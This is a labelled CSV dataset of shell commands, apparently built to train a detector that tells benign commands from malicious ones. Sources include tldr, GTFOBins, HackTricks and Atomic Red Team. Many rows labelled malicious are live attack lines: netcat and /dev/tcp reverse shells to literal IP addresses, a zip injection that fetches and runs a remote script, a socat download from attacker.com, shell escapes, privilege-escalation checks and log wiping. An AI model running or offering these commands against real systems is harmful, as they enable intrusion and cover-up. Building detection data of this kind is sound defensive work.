id,command,label,source,split
d1_009882,"curl -s -o /dev/null -w ""%{http_code}"" https://h0caaf24a.example.net",0,bash6k,train
d1_009883,unix2dos [-n|--newfile] path/to/file path/to/new_file,0,tldr,train
d1_009884,mbw -n 3 -q -t0 512,0,tldr,train
d1_009885,vmware-checkvm -h,0,tldr,train
d1_009886,./cefdebug.exe,1,hacktricks,train
d1_009887,cat credentials.json | tr 'a-z' 'A-Z',0,bash_instruct,train
d1_009888,ionic serve,0,tldr,train
d1_009889,find / -perm -g=s -type f 2>/dev/null,1,slp,train
d1_009891,pgrep mongod,0,bash_instruct,train
d1_009893,curl -L -o file.txt https://h0caaf24a.example.net/file.txt,0,bash6k,train
d1_009894,"find /data/bin/test -type d -mtime +10 -name ""[0-9]*"" -exec rm -rf {} \;",0,nl2bash,train
d1_009895,"tmsu files ""(year >= 1990 and year <= 2000) and grunge""",0,tldr,train
d1_009896,grep -i error request.log | sort -u,0,bash_instruct,train
d1_009897,"echo ""dn: cn=Atomic User, cn=Users,dc=example,dc=test\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif",1,atomic_red_team,train
d1_009898,find $parentdir -name $tofind*,0,nl2bash,train
d1_009899,IPAHound -k -s dc1.domain.local --output-raw raw.json,1,hacktricks,train
d1_009901,find Mainfolder > outputfile,0,nl2bash,train
d1_009902,"if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH""; fi",1,atomic_red_team,train
d1_009904,eb logs,1,gtfobins,train
d1_009905,ls -t vendor | head -n 1,0,bash_instruct,train
d1_009907,gdrive download --path path/to/folder id,0,tldr,train
d1_009909,CapBnd: 00000000a80425fb,1,hacktricks,train
d1_009910,pulumi up,0,tldr,train
d1_009911,qemu-img info path/to/image_file.img,0,tldr,train
d1_009913,tar -czf - fixtures | ssh svc-app@staging.internal 'cat > /backup/fixtures.tar.gz',0,bash_instruct,train
d1_009914,ls -1 /opt/app | wc -l,0,bash_instruct,train
d1_009916,cat schema.log | tail -n 15,0,bash_instruct,train
d1_009917,du -h --max-depth=1 images | sort -rh,0,bash_instruct,train
d1_009918,ps aux | head -n 5,0,bash6k,train
d1_009919,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #',1,gtfobins,train
d1_009921,[ -f test.jpg ] && cat test.jpg || echo 'not found',0,bash_instruct,train
d1_009922,watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0',1,gtfobins,train
d1_009923,aws acm import-certificate --certificate-arn certificate_arn --certificate certificate --private-key private_key --certificate-chain certificate_chain,0,tldr,train
d1_009924,"grep -R ""ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping"" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null",1,hacktricks,train
d1_009925,ss -tn dst registry.local,0,bash_instruct,train
d1_009928,cat /host/etc/passwd | head,1,hacktricks,train
d1_009929,ping -c 3 proxy.internal,0,bash_instruct,train
d1_009930,zstyle -L,0,tldr,train
d1_009931,libdir=$(dirname $(dirname $(which gcc)))/lib,0,nl2bash,train
d1_009932,tmux -S /tmp/dev_sess ls,1,hacktricks,train
d1_009933,ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null,1,hacktricks,train
d1_009934,gst-launch-1.0 source ! queue ! sink,0,tldr,train
d1_009936,"find /opt/scripts -type f -exec head -n1 {} \+ | grep -q '^#!' && find /opt/scripts -type f -exec grep -l '^#!' {} + | xargs -I{} sh -c 'tmp=$(mktemp); echo ""# Auto‑generated"" > ""$tmp""; cat ""{}"" >> ""$tmp""; mv ""$tmp"" ""{}""'",0,bash6k,train
d1_009938,apache2 -f /path/to/input-file,1,gtfobins,train
d1_009939,rabbitmqctl delete_user username,0,tldr,train
d1_009940,sudo LD_PRELOAD=/tmp/proof.so /allowed/command,1,hacktricks,train
d1_009941,"python3 - <<'PY' import time print(""realtime :"", time.time()) print(""monotonic:"", time.clock_gettime(time.CLOCK_MONOTONIC)) print(""boottime :"", time.clock_gettime(time.CLOCK_BOOTTIME)) PY",1,hacktricks,train
d1_009942,msgmerge [-h|--help],0,tldr,train
d1_009943,ncal -e year,0,tldr,train
d1_009944,"ps -u alice -o pid,cmd",0,bash6k,train
d1_009946,ln -s /root/root.txt /dev/shm/root/examples/flag,1,hacktricks,train
d1_009947,"alias gcmsg='f(){ [ -z ""$1"" ] && echo ""Commit message required"" && return 1; git add . && git commit -m ""$1"" && git push; }; f'",0,bash6k,train
d1_009949,mosquitto -c /path/to/input-file,1,gtfobins,train
d1_009952,stat -c '%s' debug.tmp,0,bash_instruct,train
d1_009954,[ -f summary.sql ] && cat summary.sql || echo 'not found',0,bash_instruct,train
d1_009955,debugfs -R 'dump 131074 /tmp/recovered.bin' ./disk.img,1,hacktricks,train
d1_009956,tldr if,0,tldr,train
d1_009957,cp changelog.log scripts/,0,bash_instruct,train
d1_009958,reset; sh 1>&0 2>&0,1,gtfobins,train
d1_009959,tldr sha512sum,0,tldr,train
d1_009960,dracut --list-modules,0,tldr,train
d1_009962,tar -czf - scripts | ssh carol@www.service.io 'cat > /backup/scripts.tar.gz',0,bash_instruct,train
d1_009963,cp -u dump.jpg tmp/,0,bash_instruct,train
d1_009964,"find . -name test -prune -o -regex "".*/my.*p.$""",0,nl2bash,train
d1_009965,"sudo opensnoop -n ""process_name""",0,tldr,train
d1_009966,[ -f audit.bak ] && cat audit.bak || echo 'not found',0,bash_instruct,train
d1_009967,screencapture -v path/to/file.mp4,0,tldr,train
d1_009969,"curl -X POST -H 'Content-Type: application/json' -d '{""name"":""alice""}' https://h9ec8b0fa.example.net/api/users",0,bash_instruct,train
d1_009970,sudo mkudffs /dev/sda1,0,linlm,train
d1_009971,sed -i '1d' customer.md,0,bash_instruct,train
d1_009972,rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null,1,hacktricks,train
d1_009973,sed 's/^[[:space:]]*//' settings.txt > clean.txt,0,bash_instruct,train
d1_009974,cat /host/etc/passwd | tail,1,hacktricks,train
d1_009977,chmod +x sales.sh,0,bash_instruct,train
d1_009978,git effort path/to/directory/*,0,tldr,train
d1_009979,code2prompt path/to/project,0,tldr,train
d1_009980,grep -c 'OutOfMemory' nginx-error.log | cat,0,bash_instruct,train
d1_009981,bq cp dataset.OLD_TABLE dataset.new_table,0,tldr,train
d1_009982,nc -cu /usr/bin/bash 89.83.246.201 9001,1,quasarnix,train
d1_009983,tail example.txt,0,bash6k,train
d1_009985,sed 's/^[[:space:]]*//' profile.txt > clean.txt,0,bash_instruct,train
d1_009986,cp -u results.tmp media/,0,bash_instruct,train
d1_009987,"grep -R ""run-parts\\|cron"" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null",1,hacktricks,train
d1_009988,kill $(ps aux | grep '[p]ython csp_build.py' | awk '{print $2}'),0,nl2bash,train
d1_009989,sudo find / -iname '*.ogg',0,nl2bash,train
d1_009991,find / -perm -4000 -type f -ls 2>/dev/null,1,hacktricks,train
d1_009992,bundle update --patch gem_name1 gem_name2 ...,0,tldr,train
d1_009993,ps -ef | head -n 50,1,hacktricks,train
d1_009995,du -h src/* 2>/dev/null | sort -rh | head -n 5,0,bash_instruct,train
d1_009997,echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh,1,atomic_red_team,train
d1_009998,chmod go-w transaction.bak,0,bash_instruct,train
d1_009999,"sed -n '10,20p' event.tsv",0,bash_instruct,train
d1_010000,nbtscan -e 39.237.139.187/24,0,tldr,train
d1_010003,e2freefrag -c chunk_size_in_kb /dev/sdXN,0,tldr,train
d1_010004,https://hc2208abd.example.net/evait-security/ClickNRoot/blob/master/1/exploit.c,1,hacktricks,train
d1_010005,sort notes.csv | uniq -c | sort -nr,0,bash_instruct,train
d1_010006,git check-ref-format --branch @{-1},0,tldr,train
d1_010007,rm -rf assets,0,bash_instruct,train
d1_010008,find . -type f -atime +30 -print,0,nl2bash,train
d1_010010,sudo chgrp mysql index.html,0,bash_instruct,train
d1_010012,tv files|env|git-repos|...,0,tldr,train
d1_010013,mv *.gif lib/,0,bash_instruct,train
d1_010014,busybox httpd -f -p 12345 -h .,1,gtfobins,train
d1_010015,tar -czf - backup | ssh deploy@auth.example.org 'cat > /backup/backup.tar.gz',0,bash_instruct,train
d1_010016,chmod go-w manifest.js,0,bash_instruct,train
d1_010017,chmod 644 payload.conf,0,bash_instruct,train
d1_010018,cat > server-command <<'EOF',1,hacktricks,train
d1_010019,diffoscope --no-progress path/to/file1 path/to/file2,0,tldr,train
d1_010021,echo /path/to/command >/path/to/temp-file,1,gtfobins,train
d1_010022,echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh,1,atomic_red_team,train
d1_010023,unexpand -t999 /path/to/input-file,1,gtfobins,train
d1_010024,ln -s transaction.md latest.log,0,bash_instruct,train
d1_010025,expect /path/to/input-file,1,gtfobins,train
d1_010026,flux suspend kustomization name,0,tldr,train
d1_010027,ss -lntp | grep -E '(:443|:8443)',1,hacktricks,train
d1_010028,n use version file.js,0,tldr,train
d1_010029,dmesg -TL,0,bash_instruct,train
d1_010030,pdfcrop path/to/input_file.pdf --bbox-odd 'left top right bottom' --bbox-even 'left top right bottom' path/to/output_file.pdf,0,tldr,train
d1_010032,wget -i /path/to/input-file,1,gtfobins,train
d1_010033,git restore [-S|--staged] path/to/file,0,tldr,train
d1_010034,sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place,1,atomic_red_team,train
d1_010035,pbmtonokia [-f|-fmt] NOL path/to/image.pbm > path/to/output.nol,0,tldr,train
d1_010036,systemd-nspawn [-b|--boot] [-D|--directory] path/to/container_root,0,tldr,train
d1_010037,sort -nr,1,hacktricks,train
d1_010038,sudo ss -tulnp,0,bash6k,train
d1_010039,wiggle path/to/file.patch [-o|--output] path/to/output_file.txt,0,tldr,train
d1_010041,"git rev-parse --abbrev-ref HEAD | awk -v staged=$(git diff --name-only --cached | wc -l) '{print $0"" (""staged"" staged)""}'",0,bash6k,train
d1_010042,[ -f response.png ] && cat response.png || echo 'not found',0,bash_instruct,train
d1_010043,sudo cp /etc/ipsec.conf.example /etc/ipsec.conf,0,linlm,train
d1_010045,pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account,1,atomic_red_team,train
d1_010047,doctl [d|databases] [p|pool] [c|create] database_id pool_name --db new_pool_name --size pool_size,0,tldr,train
d1_010048,mount -n -o remount /,0,nl2bash,train
d1_010049,find /mnt/data -type f -size 10k,0,bash_instruct,train
d1_010051,cat settings.txt | tail -n 15,0,bash_instruct,train
d1_010052,ls [-d|--directory] */,0,tldr,train
d1_010054,vacuumdb [-t|--table] table_name database_name,0,tldr,train
d1_010055,mv -n test.js test.js.old,0,bash_instruct,train
d1_010056,sudo cpufreq-aperf [-c|--cpu] 1,0,tldr,train
d1_010058,"find /usr -newermt ""Feb 1""",0,nl2bash,train
d1_010059,uv sync --check,0,tldr,train
d1_010060,sudo -u forgejo forgejo web,0,linlm,train
d1_010063,"file(""/path/to/input-file"")",1,gtfobins,train
d1_010064,wc -c report.xml,0,bash_instruct,train
d1_010065,crontab path/to/file,0,tldr,train
d1_010066,cat account.json | tail -n 15,0,bash_instruct,train
d1_010067,mullvad lan set allow,0,tldr,train
d1_010068,sudo chown erin event.txt,0,bash_instruct,train
d1_010069,yay -S rider,0,linlm,train
d1_010070,ndc -l localsock command,0,tldr,train
d1_010071,pstree -p bob,0,bash_instruct,train
d1_010073,"zipgrep ""search_pattern"" path/to/file.zip file/to/search1 file/to/search2",0,tldr,train
d1_010075,colorpicker --quit-on-keypress,0,tldr,train
d1_010076,apptainer inspect [-e|--environment] path/to/image.sif,0,tldr,train
d1_010077,hledger import path/to/bank1.csv path/to/bank2.csv --dry-run,0,tldr,train
d1_010078,"gnuplot -e 'system(""/bin/sh 1>&0"")'",1,gtfobins,train
d1_010079,comm -23 <(ls) <(ls *Music*),0,nl2bash,train
d1_010081,cut -d: -f1 /etc/passwd,0,bash6k,train
d1_010082,find . -name '*.php' -exec chmod 755 {} \; > logfile.txt,0,nl2bash,train
d1_010083,chmod +s bash,1,hacktricks,train
d1_010084,bspc monitor [-d|--reset-desktops] desktop_name1 desktop_name2,0,tldr,train
d1_010085,find /TBD -mtime +1 -type d,0,nl2bash,train
d1_010086,./stratus detonate aws.discovery.ec2-enumerate-from-instance,1,atomic_red_team,train
d1_010087,dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data,1,atomic_red_team,train
d1_010091,stat access.html,0,bash_instruct,train
d1_010092,objcopy --strip-debug path/to/source_file path/to/target_file,0,tldr,train
d1_010093,sudo unshare -UrT --fork --mount-proc --monotonic 86400 --boottime 604800 bash,1,hacktricks,train
d1_010094,"find / -type f -perm -4000 -exec ls -lh {} + | awk 'NR>1 {printf ""%s %s %s %s\n"", $1, $3, $5, $9}'",0,bash6k,train
d1_010096,stat -c '%s' release.md,0,bash_instruct,train
d1_010097,zip test.zip -T '-TT wget 155.194.6.46 -O s.sh; bash s.sh' test.pcap,1,hacktricks,train
d1_010098,cat archive.conf | sort | uniq,0,bash_instruct,train
d1_010099,kubectl events --for resource/resource_name [-n|--namespace] namespace,0,tldr,train
d1_010101,"socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat",1,gtfobins,train
d1_010102,realm list 2>/dev/null,1,hacktricks,train
d1_010103,sed 's/^[[:space:]]*//' credentials.log > clean.txt,0,bash_instruct,train
d1_010105,head -n 20 index.log,0,bash_instruct,train
d1_010107,cat pwn.c,1,hacktricks,train
d1_010108,"cut -d, -f2 gateway.log | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,train
d1_010109,netstat -an,0,bash6k,train
d1_010110,touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt,1,atomic_red_team,train
d1_010111,while read a b; do,1,hacktricks,train
d1_010112,sudo chown -R ubuntu:mysql dist,0,bash_instruct,train
d1_010113,cp -p event.conf lib/,0,bash_instruct,train
d1_010114,tic -C /path/to/input-file,1,gtfobins,train
d1_010115,omf remove name,0,tldr,train
d1_010116,wajig update,0,tldr,train
d1_010117,USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT,1,hacktricks,train
d1_010120,feh [-d|--draw-filename] path/to/images,0,tldr,train
d1_010121,cowthink -f /path/to/script.pl x,1,gtfobins,train
d1_010122,"if [ -s ""/tmp/T1552.005_aws_imds_creds.json"" ]; then cat ""/tmp/T1552.005_aws_imds_creds.json""; else echo ""No IAM credentials returned (host is not an EC2 instance with an attached role)""; fi",1,atomic_red_team,train
d1_010123,cat audit.conf | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_010125,box compile,0,tldr,train
d1_010126,sort invoice.md | uniq -c | sort -nr,0,bash_instruct,train
d1_010128,basename /path/to/dir/filename.txt .txt,0,nl2bash,train
d1_010129,expand [-i|--initial] path/to/file,0,tldr,train
d1_010130,sudo eopkg install package,0,tldr,train
d1_010131,git show-branch --more 5 branch_name1|ref1|commit1 branch_name2|ref2|commit2 ...,0,tldr,train
d1_010133,docker cp /path/to/input-file $CONTAINER_ID:input-file,1,gtfobins,train
d1_010134,/usr/bin/sh -i >& /dev/tcp/58.128.221.200/8080 0>&1,1,quasarnix,train
d1_010135,cat /proc/17709/cmdline | xargs -0 echo,0,nl2bash,train
d1_010136,mv *.conf config/,0,bash_instruct,train
d1_010137,"timedatectl | grep ""Time zone""",0,bash6k,train
d1_010138,/bin/sh -i >& /dev/tcp/85.158.154.132/9001 0>&1,1,quasarnix,train
d1_010140,beam,0,linlm,train
d1_010141,sudo chown www-data request.png,0,bash_instruct,train
d1_010142,find -iname pattern,0,nl2bash,train
d1_010144,sudo chown svc-app catalog.sql,0,bash_instruct,train
d1_010145,sudo systemctl reload haproxy,0,bash_instruct,train
d1_010146,sort inventory.csv,0,bash_instruct,train
d1_010147,yay -S rnote,0,linlm,train
d1_010148,modprobe -n -v esp4 2>/dev/null,1,hacktricks,train
d1_010149,coreauthd,0,tldr,train
d1_010150,du -h --max-depth=1 backup,0,bash_instruct,train
d1_010151,"find . -perm /u=w,g=w",0,nl2bash,train
d1_010152,nmap -p- -sV -oX a.xml 85.67.42.74; searchsploit --nmap a.xml,1,payloads,train
d1_010153,od -t x2 -N 1000 $file | cut -c8- | egrep -m1 -q ' 0d| 0d|0d$',0,nl2bash,train
d1_010154,sudo chown -R tomcat:wheel project,0,bash_instruct,train
d1_010155,cp manifest.sql manifest.sql.bak,0,bash_instruct,train
d1_010156,dwebp path/to/input.webp -bmp|-tiff|-pam|-ppm|-pgm|-yuv -o path/to/output,0,tldr,train
d1_010158,gcc -x c -E /path/to/input-file,1,gtfobins,train
d1_010160,find logs -type f -name '*.xml' -print0 | xargs -0 rm -f,0,bash_instruct,train
d1_010161,/mnt/share/a.out,1,hacktricks,train
d1_010162,cat credentials.txt | sort -u,0,bash_instruct,train
d1_010163,GetUserSPNs.py domain/username:password -dc-ip domain_controller_ip,0,tldr,train
d1_010164,"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",1,atomic_red_team,train
d1_010165,env -i,0,nl2bash,train
d1_010166,rdiff-backup restore --at 3D path/to/backup path/to/destination,0,tldr,train
d1_010167,echo $?\n0,0,bash6k,train
d1_010168,touch release.log,0,bash_instruct,train
d1_010169,attic create /path/to/repo::backup ~/Documents,0,linlm,train
d1_010170,klist -k -K -e /etc/krb5.keytab,1,hacktricks,train
d1_010171,ss -tn dst web01.corp.net,0,bash_instruct,train
d1_010172,ExecStart=/path/to/command,1,gtfobins,train
d1_010173,iptables -P INPUT DROP,1,hacktricks,train
d1_010174,cordova platform remove platform,0,tldr,train
d1_010175,sudo mkfs.ntfs /dev/sdXY,0,tldr,train
d1_010176,docker run --name metricbeat -d docker.elastic.co/beats/metricbeat:7.17.0,0,linlm,train
d1_010177,"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",1,atomic_red_team,train
d1_010178,find / -uid 1005,0,nl2bash,train
d1_010180,capsh --,1,gtfobins,train
d1_010181,"SITE_PACKAGES=$(""$TEMPDIR/env/bin/python3"" -c ""import site; print(site.getsitepackages()[0])"")",1,atomic_red_team,train
d1_010182,msfvenom [-p|--payload] linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port [-f|--format] elf [-o|--out] path/to/binary,0,tldr,train
d1_010183,docker run --name metabase -p 3000:3000 -d metabase/metabase,0,linlm,train
d1_010184,hg serve --style style,0,tldr,train
d1_010186,prowler --help,0,tldr,train
d1_010187,b2sum path/to/file1 path/to/file2 ...,0,tldr,train
d1_010189,xxd -l 64 manifest.tar.gz,0,bash_instruct,train
d1_010190,nginx -c /path/to/temp-file,1,gtfobins,train
d1_010191,grep -a '@' /proc/net/unix 2>/dev/null | head -n 50,1,hacktricks,train
d1_010192,pacconf --verbose directive,0,tldr,train
d1_010193,grep -oE '(INFO|WARN|ERROR|DEBUG)' scheduler.log | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_010194,cat export.log | tr 'a-z' 'A-Z',0,bash_instruct,train
d1_010196,sudo tune2fs -l /dev/sda1 | grep has_journal,0,linlm,train
d1_010197,sudo chown www-data server.sh,0,bash_instruct,train
d1_010199,tldr pamstretch,0,tldr,train
d1_010200,rm -v *.bak,0,nl2bash,train
d1_010201,mv *.zip assets/,0,bash_instruct,train
d1_010202,cdk init [-l|--language] language,0,tldr,train
d1_010203,docker [pause|container pause] container1_name container2_name ...,0,tldr,train
d1_010204,kiterunner brute https://h0caaf24a.example.net [-w|--wordlist] path/to/wordlist.txt --ignore-length 100-105,0,tldr,train
d1_010205,mv dump.css logs/,0,bash_instruct,train
d1_010206,agate [-h|--help],0,tldr,train
d1_010207,cat payment.conf | wc -l,0,bash_instruct,train
d1_010208,"echo """" >> /tmp/atomic_tmp.service",1,atomic_red_team,train
d1_010210,bw logout,0,tldr,train
d1_010211,ssh postgres@23.62.78.248 uptime,0,bash_instruct,train
d1_010214,echo $(readlink -f /dev/disk/by-uuid/$1) is not mounted,0,nl2bash,train
d1_010215,tldr g++,0,tldr,train
d1_010217,scp nginx@auth.service.io:/var/log/audit.log .,0,bash_instruct,train
d1_010218,which [-a|--all] executable,0,tldr,train
d1_010219,create_ap wlan0 eth0 access_point_ssid passphrase,0,tldr,train
d1_010220,"find . -name ""*.txt"" -print | grep -v 'Permission denied'",0,nl2bash,train
d1_010221,DEVICE=eth0,1,hacktricks,train
d1_010222,sudo nft delete rule inet filter input handle 3,0,tldr,train
